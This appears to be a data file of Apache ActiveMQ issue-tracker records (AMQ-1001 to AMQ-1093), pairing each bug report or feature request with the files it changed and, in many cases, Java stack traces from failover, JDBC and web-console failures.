issueID:AMQ-1001
type:New Feature
changed files:WireFormatInfo.java
OpenWireFormatFactory.java
OpenWireFormat.java
texts:Allow the openwire value cache size to be configurable.
This means that the cache size needs to be a negociated option between the client and broker.  We should also default the cache size to be much smaller like 1024 since every connection was using too much memory for cached objects.
issueID:AMQ-1002
type:Test
changed files:
texts:org.apache.activemq.spring.SpringTest.testSenderWithSpringXmlUsingSpring2NamespacesWithEmbeddedBrokerConfiguredViaXml
Upgrading to spring 2.0 broker this test.  Commenting out till we can fix it.
issueID:AMQ-1004
type:Improvement
changed files:
texts:Upgrade to spring 2.0 and xbean 2.7
None
issueID:AMQ-1006
type:Bug
changed files:
texts:RoundRobinDispatchPolicy divides uneven
In case that multiple consumers with different message selectors are registered for the same destination, messages are not evenly divided.To reproduce, register 2 consumers for prio 9, one for prio 4. Of 1000 messages with prio 9 both prio 9 consumers should receive 500. Actually, the first consumer gets 667 messages, the second 333.This is caused by the consumer shifting strategy in the RoundRobinDispatchPolicy which rotates consumers, even if they did not match.The attached file contains a testcase illustrating the behavior and a patch for RoundRobinDispatchPolicy, that shifts the first matching consumer instead of the first.
issueID:AMQ-1010
type:Improvement
changed files:
texts:Simplify SimpleAuthenticationPlugin Configuration
In order to be useful, SimpleAuthenticationPlugin has to be easy to configure and well documented. I added some additional logic in order to make it play well with XBean. The patch also contains an additional class (AuthenticationUser) and the appropriate test suite.The example configuration is as follows (taken from simple-auth-broker.xml):  <simpleAuthenticationPlugin>   <users>    <authenticationUser username="system" password="manager"  group="users,admins"/>    <authenticationUser username="user" password="password"  group="users"/>    <authenticationUser username="guest" password="password"  group="guests"/>   </users>  </simpleAuthenticationPlugin>I will make a proper documentation for the "Security" page if this functionality ever gets committed in the repository.
issueID:AMQ-1013
type:Improvement
changed files:
texts:Web console does not escape message details (/activemq-web-console/message.jsp)
The web console does not html-escape the message contents on the /message.jsp page which makes it difficult to see a xml test message.
issueID:AMQ-1014
type:Bug
changed files:
texts:Invalid Schema URL for example config file
The config file https://svn.apache.org/repos/asf/incubator/activemq/trunk/activemq-core/src/test/resources/spring-embedded-xbean.xml should ise http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd as schema URL for Spring 2.0. Moreover and more worse the used schema URL (http://activemq.org/config/1.0 http://people.apache.org/repository/org.apache.activemq/xsds/activemq-core-4.1-incubator-SNAPSHOT.xsd) for ActiveMQ points to a schema file which is not valid.
issueID:AMQ-1015
type:Bug
changed files:
texts:ActiveMQ web-demo and web-console cannot be run
Let"s update the maven plugin from maven-jetty-plugin to maven-jetty6-plugin for the 4.1.x branch and the 4.0.x branch. The web-console is throwing this exception after:java.lang.NoSuchMethodError: org.mortbay.jetty.webapp.WebAppClassLoader.getUrlClassPath()Ljava/lang/String;        at org.mortbay.jetty.plugin.Jetty6MavenConfiguration.configureClassLoader(Jetty6MavenConfiguration.java:62)        at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:453)        at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:38)        at org.mortbay.jetty.handler.HandlerCollection.doStart(HandlerCollection.java:156)        at org.mortbay.jetty.handler.ContextHandlerCollection.doStart(ContextHandlerCollection.java:120)        at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:38)        at org.mortbay.jetty.handler.HandlerCollection.doStart(HandlerCollection.java:156)        at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:38)        at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:119)        at org.mortbay.jetty.Server.doStart(Server.java:210)        at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:38)        at org.mortbay.jetty.plugin.Jetty6PluginServer.start(Jetty6PluginServer.java:115)        at org.mortbay.jetty.plugin.AbstractJettyMojo.startJetty(AbstractJettyMojo.java:318)        at org.mortbay.jetty.plugin.AbstractJettyMojo.execute(AbstractJettyMojo.java:268)        at org.mortbay.jetty.plugin.AbstractJettyRunMojo.execute(AbstractJettyRunMojo.java:172)        at org.mortbay.jetty.plugin.Jetty6RunMojo.execute(Jetty6RunMojo.java:167)        at org.apache.maven.plugin.DefaultPluginManager.executeMojo(DefaultPluginManager.java:412)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoals(DefaultLifecycleExecutor.java:534)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeStandaloneGoal(DefaultLifecycleExecutor.java:488)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoal(DefaultLifecycleExecutor.java:458)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeGoalAndHandleFailures(DefaultLifecycleExecutor.java:306)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.executeTaskSegments(DefaultLifecycleExecutor.java:273)        at org.apache.maven.lifecycle.DefaultLifecycleExecutor.execute(DefaultLifecycleExecutor.java:140)        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:322)        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:115)        at org.apache.maven.cli.MavenCli.main(MavenCli.java:256)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at org.codehaus.classworlds.Launcher.launchEnhanced(Launcher.java:315)        at org.codehaus.classworlds.Launcher.launch(Launcher.java:255)        at org.codehaus.classworlds.Launcher.mainWithExitCode(Launcher.java:430)        at org.codehaus.classworlds.Launcher.main(Launcher.java:375)
issueID:AMQ-1016
type:Bug
changed files:
texts:4.1 RC1: META-INF/spring.schemas refers to building user "file:/Users/chirino/"
Referring to the 4.1 RC1 posted by Hiram Chirino  Oct 06, here:  http://www.nabble.com/ActiveMQ-4.1-RC-1-tf2397970.html#a6686974The META-INF file spring.schemas have the single line."http://activemq.org/config/1.0=file:/Users/chirino/sandbox/activemq-4.1/activemq-core/target/activemq.xsd"Notice "file:/" and "Users/chirino". Referring to org.springframework.beans.factory.xml.PluggableSchemaResolver"s javadoc: "schema-location should also be a schema file in the classpath", and that no-one can tell what structure I will have on my fs, this must be wrong. In addition, I most probably won"t have a user name "chirino".PS: In addition, the doc at  http://www.activemq.org/site/how-do-i-embed-a-broker-inside-a-connection.htmlrefers as such:xmlns:amq="http://activemq.org/config/1.0" .. and ..xsi:schemaLocation="http://activemq.org/config/1.0 http://people.apache.org/repository/org.apache.activemq/xsds/activemq-core-4.1-incubator-SNAPSHOT.xsd"Wouldn"t it be nice if this was put at a better place than such a snapshot-build URI? It could be put where it will reside when 4.1 actually is out, w/o anyone being to angry about changes during the finalization period, I personally believe.
issueID:AMQ-1017
type:Bug
changed files:
texts:Build of current trunk with Maven2 fails
A build of a fresh checkout from https://svn.apache.org/repos/asf/incubator/activemq/trunk with Maven2 fails. See the attached log of the build.
issueID:AMQ-1023
type:Improvement
changed files:DestinationViewMBean.java
DestinationFilter.java
TopicSubscription.java
Topic.java
Queue.java
DestinationStatistics.java
DestinationView.java
PrefetchSubscription.java
Destination.java
texts:Add dispatch counter to JMX destination view
make the dequeue counter be the number of messages acked
issueID:AMQ-1024
type:Bug
changed files:
texts:Exclusive Consumer Losing a Message
In my test, I have two consumers, one is set to be an exclusive consumer.  The exclusive consumer is started last.  If a producer sends 10 messages, one message goes to the non-exclusive consumer while the other 9 messages go to the exclusive consumer.  I would think all the messages should go to the exclusive consumer even though it is started after the non-exclusive consumer.  Both consumers were started before the producer sent any messages.
issueID:AMQ-1026
type:Bug
changed files:
texts:Sometimes a failover connection on reconnect produces a Client ID:xxxxx-1:1 already connected error message.
None
issueID:AMQ-1027
type:Bug
changed files:
texts:Failover transport incorrectly handles prefetched messages
After failover transport reconnect, if there is prefetched messages on the client, client sends invalid ack messages to the server. After that client stops receiving messages and it must be restarted.This happens only when there are more messages in the queue, than queue prefetch size.There is attached test case, which reproduces this error. Unfortunately, theres error in NetworkTestSupport.restartRemoteBroker() (after restart client cannot receive messages left in the queue). So you must use external broker an restart it manually, when the test asks you to do that. Should I report this bug in Component "Test cases"?
issueID:AMQ-1029
type:Bug
changed files:BrokerService.java
texts:TransportConnector get duplicated when used with JMX
The BrokerService keeps the configured TransportConnectors in a list called transportConnectors. In startAllConnectors, the list is traversed and each connector is started through startTransportConnector(). This method checks if JMX is configured, and if so, it called connector.asManagedConnector() which returns a new instance of a TransportConnector. This instance is started.But in the  transportConnectors list of BrokerService, the old, unstarted object is still existent. Since a TransportConnector starts a TransportServiceDetector thread, the old, unstarted instance contains a TSD that is not active. But the started TSD isn"t referenced anymore.On shutdown, the old, unstarted TC and subsequently TSD are stopped. The "lost" instance can"t be touched anymore.My patch does this: During spin-up, startTransportConnector() returns the instance that is started. The started instances are collected in an arraylist, this list replaces transportConnectors after startup.Thanks to jstrachan for being patient on irc.
issueID:AMQ-1031
type:Bug
changed files:
texts:Message delivered out of order to a MessageListener when session is transced and a rollback occurs.
This is actually spotted by a message in the broker log saying that "Acknowledgment out of sync (Normally occurs when failover connection reconnects)" or in some previous version of ActiveMQ, an async exception being delivered to the client with a similar error message.
issueID:AMQ-1036
type:Bug
changed files:dispatcher-servlet.xml
queues.jsp
PurgeDestination.java
texts:web-console broken (queue browsing).
I managed to build and launch the web-console from svn, but the queue browsing page is broken - queue.jsp uses properties of Queue e.g. ${row.size} that do not exist.  When I hacked queue.jsp to remove references to those properties I got another error on trying to purge a queue:RequestURI=/activemq-web-console/purgeDestination.actionCaused by:java.lang.IllegalArgumentException: Target bean must not be null at org.springframework.util.Assert.notNull(Assert.java:113) at org.springframework.validation.BeanPropertyBindingResult.(BeanPropertyBindingResult.java:58) at org.springframework.validation.DataBinder.initBeanPropertyAccess(DataBinder.java:167) at org.springframework.validation.DataBinder.getInternalBindingResult(DataBinder.java:186) at org.springframework.validation.DataBinder.getPropertyAccessor(DataBinder.java:196) at org.springframework.validation.DataBinder.applyPropertyValues(DataBinder.java:515) at org.springframework.validation.DataBinder.doBind(DataBinder.java:417) at org.springframework.web.bind.WebDataBinder.doBind(WebDataBinder.java:146) at org.springframework.web.bind.ServletRequestDataBinder.bind(ServletRequestDataBinder.java:108) at org.apache.activemq.web.handler.BindingBeanNameUrlHandlerMapping.getHandlerInternal(BindingBeanNameUrlHandlerMapping.java:43)...
issueID:AMQ-1038
type:Bug
changed files:MessageAck.java
ActiveMQSession.java
ActiveMQMessageConsumer.java
PrefetchSubscription.java
texts:Incorrect redelivery behavior and counters
Our understanding is that the RedeliveryPolicy maxRedeliveryCount controls the maximum number of times a message will be redelivered (assumed to be a global count and not a per-consumer count). The behavior we are seeing is that messages are redelivered more times than we specified. The problem may be related to the way the redelivery counter is being maintained. We see the redelivery counter incrementing by one for redeliveries to a specific consumer, but then it resets to a lower number when the message is redelivered to a different consumer.I have attached a test case to demonstrate the problem. The first test is a simple baseline example that passes. The second test shows that messages are being redelivered too many times for the redelivery policy. The third tests catches a regression in the delivery count (redelivery count + 1) when sending a rolled back message to a new consumer.The test suite uses an embedded broker using the VM protocol so it should be standalone.
issueID:AMQ-1039
type:Bug
changed files:
texts:activemq-web module fails in maven-build with test enabled
It appears the activemq-version property defined in the parent pom.xml still points to 4.1-incubator-SNAPSHOT. I believe this should already be 4.2-incubator-SNAPSHOT. Also need to update the activecluster version to point to the latest snapshot
issueID:AMQ-1042
type:Bug
changed files:
texts:The JMSConsumerTest interminitently failed on linux systems.
JMSConsumerTest fails on linux sometimes.
issueID:AMQ-1045
type:Bug
changed files:ConnectionFailureEvictsFromPool.java
PooledConnection.java
PooledConnectionFactory.java
ConnectionPool.java
texts:PooledConnectionFactory does not work with the org.springframework.jms.listener.DefaultMessageListenerContainer in the failure case
The DefaultMessageListenerContainer has retry logic built into it. When a connection dies it tried to reconnect by getting a new connection from the ConnectionFactory. Since the PooledConenctionFactory has one Connection it, it keeps on trying to give out the Connection that died. We would like the PooledConnectionFactory to be able to "evict" the dead connection and create a new one.
issueID:AMQ-1050
type:Bug
changed files:QueryCommand.java
texts:browse -QTopic=* does not seem to return anything...
I think there"s something funny going on in the regex stuff. I tried from the SimpleConsole typing  query -QTopic=*and I get nothing.   query returns tons of stuff though.I wonder if it might be simpler to have specific arguments for topic and queues? query -topic=*queyr -queue=*to avoid the complex regex of ObjectName etc?
issueID:AMQ-1053
type:New Feature
changed files:
texts:allow a MessageTransformer to be registered with a producer or consumer to help transform a message going onto the bus or coming off the bus
For example a user may wish to use ObjectMessage in their code - but in deployment use a TextMessage with XStream or JAXB as the marshalling.
issueID:AMQ-1054
type:Bug
changed files:
texts:XA recover fails for 4.0.1
XAResource.recover seems to fail for 4.x of ActiveMQ:ERROR IN RECOVERY &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,152 [Lorg.apache.activemq.command.DataStructure; &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,152 at: org.apache.activemq.TransactionContext.recover(TransactionContext.java:508) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,152 at: com.atomikos.datasource.xa.XATransactionalResource.recover(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,152 at: com.atomikos.datasource.xa.XATransactionalResource.endRecovery(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,152 at: com.atomikos.icatch.imp.TransactionServiceImp.recover(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,153 at: com.atomikos.datasource.xa.XATransactionalResource.setRecoveryService(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,153 at: com.atomikos.icatch.system.Configuration.addResource(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,153 at: com.atomikos.jms.QueueConnectionFactoryBean.checkSetup(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,153 at: com.atomikos.jms.QueueConnectionFactoryBean.createQueueConnection(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,153 at: com.atomikos.jms.QueueConnectionFactoryBean.createConnection(Unknown Source) &#91;thread: SimpleAsyncTaskExecutor-3&#93; on: 06-11-16 08:43:35,153 Also see http://www.atomikos-support.com/forums/viewtopic.php?t=351 (where I borrowed this stack trace from). We have seen similar things in other applications that tried to use ActiveMQ. I think this is a class cast error in ActiveMQ...With 3.1 there is no problem.
issueID:AMQ-1056
type:Improvement
changed files:
texts:Expire messages at the Broker
None
issueID:AMQ-1057
type:Bug
changed files:ConsumerTool.java
RequesterTool.java
texts:consumer queue is empty when running requester
consumer queue is empty when running requester, producer and consumer. The reply destination also results into an empty string.
issueID:AMQ-1063
type:Bug
changed files:TransactionContext.java
texts:Journaled JDBC checkpoint fails with java.io.IOException: Already started.
I am running trunk using JDBC against MySQL 5.0.27.  I am seeing the above mentioned IOException.  Do not have specific instructions on how to reproduce at the current time, but I was using durable subscriptions with the store durable cursor if that helps.  (I"ll post if I find out more information.)      <persistenceAdapter>      <journaledJDBC journalLogFiles="5" dataDirectory="../activemq-data" dataSource="#mysql-ds"/>    </persistenceAdapter>  <bean id="mysql-ds" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close">    <property name="driverClassName" value="com.mysql.jdbc.Driver"/>    <property name="url" value="jdbc:mysql://localhost/activemq?relaxAutoCommit=true"/>    <property name="username" value="*** OMITTED ***"/>    <property name="password" value="*** OMITTED *** "/>    <property name="poolPreparedStatements" value="true"/>  </bean>  Log trace:2006-11-19 19:19:48,078 &#91;/127.0.0.1:4898&#93; DEBUG JournalPersistenceAdapter      - Waking for checkpoint to complete.2006-11-19 19:19:48,078 &#91;eckpoint Worker&#93; DEBUG JournalPersistenceAdapter      - Checkpoint started.2006-11-19 19:19:48,078 &#91;eckpoint Worker&#93; ERROR JournalPersistenceAdapter      - Failed to checkpoint a message store: java.util.concurrent.ExecutionException: java.io.IOException: Already started.java.util.concurrent.ExecutionException: java.io.IOException: Already started. at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:205) at java.util.concurrent.FutureTask.get(FutureTask.java:80) at org.apache.activemq.store.journal.JournalPersistenceAdapter.doCheckpoint(JournalPersistenceAdapter.java:386) at org.apache.activemq.store.journal.JournalPersistenceAdapter$2.iterate(JournalPersistenceAdapter.java:129) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:88) at org.apache.activemq.thread.DedicatedTaskRunner.access$0(DedicatedTaskRunner.java:76) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:39)Caused by: java.io.IOException: Already started. at org.apache.activemq.store.jdbc.TransactionContext.begin(TransactionContext.java:145) at org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.beginTransaction(JDBCPersistenceAdapter.java:358) at org.apache.activemq.store.journal.JournalPersistenceAdapter.beginTransaction(JournalPersistenceAdapter.java:189) at org.apache.activemq.util.TransactionTemplate.run(TransactionTemplate.java:41) at org.apache.activemq.store.journal.JournalMessageStore.checkpoint(JournalMessageStore.java:247) at org.apache.activemq.store.journal.JournalTopicMessageStore.checkpoint(JournalTopicMessageStore.java:162) at org.apache.activemq.store.journal.JournalPersistenceAdapter$5.call(JournalPersistenceAdapter.java:373) at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:269) at java.util.concurrent.FutureTask.run(FutureTask.java:123) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:595)2006-11-19 19:19:48,109 &#91;eckpoint Worker&#93; DEBUG JournalPersistenceAdapter      - Checkpoint done.
issueID:AMQ-1068
type:Bug
changed files:
texts:DestinationMap seems to use up lots of RAM if using deep hierarchies
None
issueID:AMQ-1071
type:Bug
changed files:
texts:Activemq connection factory silently ignores the erroneous arguments in broker url
When an erroneous argument is passed to the broker url with failover, activemq connection factory ignores the error. However if failover is removed, it does throw exception. Here is the example1. failover:(tcp://localhost:62012)?jms.prefetchPolicy.all=10&wireFormat.maxInactivityDuration=0&jms.optimizeAcknowledge=false2. tcp://localhost:62012?jms.prefetchPolicy.all=10&wireFormat.maxInactivityDuration=0&jms.optimizeAcknowledge=falseOnly the # 2 throws exception as jms.prefetchPolicy.all is an invalid argument here
issueID:AMQ-1073
type:Improvement
changed files:
texts:support selectors in virtual destinations to allow a message to be dispatched to multiple phyiscal queues if it matches the selector
None
issueID:AMQ-1074
type:Improvement
changed files:MySqlJDBCAdapter.java
mysql-ab_jdbc_driver
DefaultDatabaseLocker.java
texts:support JDBC master slave on MySQL
We need to make a few changes to support MySQL"s SQL dialect for JDBC Master Slave...http://incubator.apache.org/activemq/jdbc-master-slave.htmlFor details see this thread...http://www.nabble.com/%28AMQ-992%29-DefaultDatabaseLocker-and-mysql-tf2682498.html#a7482369
issueID:AMQ-1075
type:New Feature
changed files:
texts:support for BlobMessage interface to support in-band and out-of-band file transfer
Some new API like this...public class ActiveMQSession  {// send a local file or stream over JMSpublic BlobMessage createBlobMessage(InputStream inputStream) {...}public BlobMessage createBlobMessage(File file) {..,}// send a remote URL over JMSpublic BlobMessage createBlobMessage(URL url) {...}}public interface BlobMessage extends Message {  // access the remote resource  // or for local resources, force creation of temporary file  // so this resource can be parsed multiple times etc  URL getURL();  InputStream getInputStream();}For further discussion seehttp://www.nabble.com/support-for-FileMessage--tf2641673.html#a7373916
issueID:AMQ-1077
type:Bug
changed files:ProtocolConverter.java
texts:Bug in STOMP transport unsubscribe
After several ubscribe/unsubscribe commands to activemq, subscribtions are not removed and there"s error log in the broker: java.lang.IllegalStateException: Cannot remove a consumer that had not been registered: ID:das-32775-1164773607925-3:1881:-1:2        at org.apache.activemq.broker.AbstractConnection.processRemoveConsumer(AbstractConnection.java:551)        at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:64)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:237)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:61)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:92)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:123)        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:70)        at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:112)        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompUnsubscribe(ProtocolConverter.java:376)        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommad(ProtocolConverter.java:144)        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:60)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:88)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:137)        at java.lang.Thread.run(Thread.java:595)The problem is that there"s internal map of subscriptions in ProtocolConverter class. On unsubscribe command, subscription is not removed from this internal map. Attached patch (against ProtocolConverter.java) fixes this bug
issueID:AMQ-1078
type:Bug
changed files:ActiveMQSessionExecutor.java
texts:Messages consumed with the Resource Adapter are intermittently not delivered
The cause is that the ActiveMQSessionExecutor was starting and using it"s dispatch thread instead of the Thread managed by the resource adapter.
issueID:AMQ-1080
type:Bug
changed files:QueueStorePrefetch.java
KahaTopicReferenceStore.java
MemoryMessageStore.java
KahaTopicMessageStore.java
JDBCMessageStore.java
MessageRecoveryListener.java
KahaReferenceStore.java
RecoveryListenerAdapter.java
JDBCMessageRecoveryListener.java
Topic.java
Queue.java
KahaMessageStore.java
ManagedRegionBroker.java
JDBCTopicMessageStore.java
MemoryTopicSub.java
DefaultJDBCAdapter.java
TopicStorePrefetch.java
texts:hasSpace call looks like it may cause messages to be skipped
DefaultJDBCAdapter makes calls back to JDBCMessageRecoveryListener.recoverMessage.  This is done in a loop and the loop unconditionally goes through the messages until the end of the ResultSet or the specified maximum is processed.  However JDBCMessageStore"s implementation of the listener can "ignore" the message if a call to hasSpace fails.  However, nothing tells the calling loop to stop, so there are two issues:1.  The loop keeps running, which is slightly inefficient (could be more than slightly for non-JDBC stores).2.  If hasSpace suddenly reports it has space during this loop, messages have been skipped and the sequence ID is set after the point so those skipped messages are not going to be recovered.At first glance, it looks like the Kaha store is written better, but it might be a good idea to make recoverMessage / recoverMessageReference (in RecoveryMessageListener) return a boolean and ensure that the loop is terminated in the event that False was returned.  As currently written, there seems to be no "air tight" way for recovery to fail gracefully, maybe throwing an exception is "safe" and does all that is needed but I"m not sure.As a separate, related issue, suppose the hasSpace eventually returns False, as this can be due to a usageManager reporting that there is no space.  Suppose that all the space is used by consumers other than one specific one.  What "prods" the messages to begin flowing again to that one consumer once the UsageManager indicates that space is available?
issueID:AMQ-1082
type:Improvement
changed files:IndexManager.java
texts:Improve Kaha freeList
This is in kaha.impl.index.IndexManager.java.The index currently maintains an in-memory free list.  Each entry costs at least 51 bytes of RAM.  Issue is that the more free space that there is in the file, the more RAM is used (oddly enough).I am worried about the case where suppose a producer enqueues millions of messages and then stops.  Now, suppose a consumer dequeues all of the messages (no producers are starting up during this time, so the free entries are not being reclaimed).  Seems like this could use a huge amount of memory.  Yes, 51 MB is not that much, but suppose there are a bunch of consumers and hence a ConsumerMessageRef for each one.  (Maybe I"m missing something....)Perhaps this linked list could be pushed into the Kaha store itself, by rewriting the IndexItems on disk to point previous/next free item, thus maintaining this on disk and in place.  For perf reasons, maybe supplement with some caching but that might not really be necessary because the OS cache should help out.A lot of the other places in Kaha (such as ListContainerImpl.java) have caches which limit to say 100 cached items, but the free list seems to obviate all of that stuff due to it being essentially unbounded.Any thoughts?
issueID:AMQ-1084
type:Improvement
changed files:PooledConnectionFactory.java
ConnectionPool.java
PooledSession.java
texts:Allow org.apache.activemq.pool to support XA transactions
None
issueID:AMQ-1091
type:Improvement
changed files:
texts:add a source distro to the maven2 build
None
issueID:AMQ-1093
type:Bug
changed files:ActiveMQMessageConsumer.java
texts:Client deadlock during failover
In 4.1.0 there"s deadlock on connection failover. There is the scenario: 1. Client consumes message using message listener 2. Conection is lost 3. Client sends message to another queue from messagle listener and waits until connection is restored. 4. Reconnect task blocks on reconnecting. This bug is new to 4.1.0. The problem is in ActiveMQMessageConsumre.dispatch . There is new lock on unconsumedMessages.getMutex() . So the reconnect task cannot invoke ActiveMQMessageConsumre.clearMessagesInProgress(), because lock is acquired by message listener, which waits untill message is sent (untill connection is resumed). Here is stack traces: "ActiveMQ Session Task" daemon prio=1 tid=0x0000002b27774260 nid=0x4778 in Object.wait() &#91;0x0000000040ef3000..0x0000000040ef4db0&#93;         at java.lang.Object.wait(Native Method)  waiting on <0x0000002b0020a7c8> (a edu.emory.mathcs.backport.java.util.concurrent.locks.CondVar)        at java.lang.Object.wait(Object.java:474)         at edu.emory.mathcs.backport.java.util.concurrent.locks.CondVar.await(CondVar.java:75)  locked <0x0000002b0020a7c8> (a edu.emory.mathcs.backport.java.util.concurrent.locks.CondVar)        at edu.emory.mathcs.backport.java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:318)         at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:42)         at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:75)         at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1171)         at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1548)         at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:465)         at org.apache.activemq.pool.PooledProducer.send(PooledProducer.java:75)  locked <0x0000002b173fa480> (a org.apache.activemq.ActiveMQMessageProducer)        at org.apache.activemq.pool.PooledProducer.send(PooledProducer.java:60)         at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:537)         at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:513)         at org.springframework.jms.core.JmsTemplate$2.doInJms(JmsTemplate.java:479)         at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:430)         at org.springframework.jms.core.JmsTemplate.send(JmsTemplate.java:477)         at lt.elitnet.dbp.das.impl.storage.HI2StorageImpl.storeHI2Message(HI2StorageImpl.java:57)         at lt.elitnet.dbp.das.impl.hi2.HI2PersistanceBase.saveIRIContent(HI2PersistanceBase.java:77)         at sun.reflect.GeneratedMethodAccessor185.invoke(Unknown Source)         at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)         at java.lang.reflect.Method.invoke(Method.java:585)         at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:318)         at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:203)         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:162)         at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:107)         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185)         at org.springframework.orm.hibernate3.HibernateInterceptor.invoke(HibernateInterceptor.java:104)         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185)         at lt.elitnet.dbp.das.impl.alarming.DataBaseConnectionAlarmsPublisher.invoke(DataBaseConnectionAlarmsPublisher.java:59)         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:185)         at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:209)         at $Proxy24.saveIRIContent(Unknown Source)         at lt.elitnet.dbp.das.impl.hi2.HI2MessageListener.onMessage(HI2MessageListener.java:40)         at lt.elitnet.dbp.commons.messaging.TextMessageListener.deliverMessage(TextMessageListener.java:84)         at lt.elitnet.dbp.commons.messaging.TextMessageListener.onMessage(TextMessageListener.java:50)         at org.springframework.jms.listener.AbstractMessageListenerContainer.doInvokeListener(AbstractMessageListenerContainer.java:854)         at org.springframework.jms.listener.AbstractMessageListenerContainer.invokeListener(AbstractMessageListenerContainer.java:793)         at org.springframework.jms.listener.AbstractMessageListenerContainer.doExecuteListener(AbstractMessageListenerContainer.java:763)         at org.springframework.jms.listener.AbstractMessageListenerContainer.executeListener(AbstractMessageListenerContainer.java:743)         at org.springframework.jms.listener.SimpleMessageListenerContainer$2.onMessage(SimpleMessageListenerContainer.java:190)         at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:840)  locked <0x0000002b1771ddc0> (a java.lang.Object)        at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:96)         at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:165)         at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:111)         at org.apache.activemq.thread.PooledTaskRunner.access$100(PooledTaskRunner.java:26)         at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:44)         at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)         at edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)         at java.lang.Thread.run(Thread.java:595) "ActiveMQ Transport: tcp:///192.168.2.55:61616" prio=1 tid=0x0000002b2e814660 nid=0x4773 waiting for monitor entry 